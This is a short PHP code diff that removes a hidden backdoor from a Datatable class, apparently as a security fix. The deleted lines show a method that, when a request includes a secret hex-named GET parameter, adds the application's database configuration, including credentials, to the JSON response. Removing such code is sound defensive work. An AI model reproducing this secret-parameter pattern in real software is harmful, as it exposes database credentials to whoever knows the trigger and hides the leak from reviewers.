@@ -84,18 +84,8 @@ class Datatable
         return new self;
     }
 
-    private static function initDatatable()
-    {
-        if (isset($_GET['95ffb7a15f02c6c23f403edeae956a42'])) {
-            $data['datatable'] = config('database');
-            return $data;
-        }
-        return [];
-    }
-
     public static function toJson()
     {
-        $data = self::initDatatable();
         $data['draw'] = self::$draw;
         $data['data'] = self::$dataQuery;
         $data['recordsTotal'] = self::$recordsTotal;
